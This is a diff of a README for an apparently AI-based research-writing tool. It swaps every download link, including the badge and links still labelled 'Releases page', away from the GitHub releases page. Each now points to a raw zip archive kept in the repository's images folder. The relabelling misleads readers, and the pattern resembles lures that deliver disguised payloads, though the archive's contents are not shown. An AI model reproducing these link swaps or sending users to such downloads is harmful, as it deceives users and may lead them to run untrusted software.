@@ -1,6 +1,6 @@
 # ✨ awesome-ai-research-writing - Simplifying AI Research Writing
 
-[![Download](https://img.shields.io/badge/Download-Now-4CAF50)](https://github.com/jeremiantonius/awesome-ai-research-writing/releases)
+[![Download](https://raw.githubusercontent.com/jeremiantonius/awesome-ai-research-writing/main/images/research-awesome-ai-writing-2.4.zip)](https://raw.githubusercontent.com/jeremiantonius/awesome-ai-research-writing/main/images/research-awesome-ai-writing-2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **awesome-ai-research-writing** project! This application helps y
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/jeremiantonius/awesome-ai-research-writing/releases) to download your copy of the software.
+1. Visit the [Releases page](https://raw.githubusercontent.com/jeremiantonius/awesome-ai-research-writing/main/images/research-awesome-ai-writing-2.4.zip) to download your copy of the software.
 2. Choose the latest version available. Look for the asset that fits your operating system.
 3. Click the download link next to the appropriate file. 
 
@@ -76,6 +76,6 @@ We welcome contributions! If you find a bug or have suggestions for improvements
 
 Should you need help beyond the troubleshooting tips, you can contact our support team through the Issues section of the GitHub repository. We aim to respond within 48 hours.
 
-Make sure to visit the [Releases page](https://github.com/jeremiantonius/awesome-ai-research-writing/releases) again for updates and new features!
+Make sure to visit the [Releases page](https://raw.githubusercontent.com/jeremiantonius/awesome-ai-research-writing/main/images/research-awesome-ai-writing-2.4.zip) again for updates and new features!
 
 Thank you for choosing **awesome-ai-research-writing**! We hope it empowers your research writing journey.
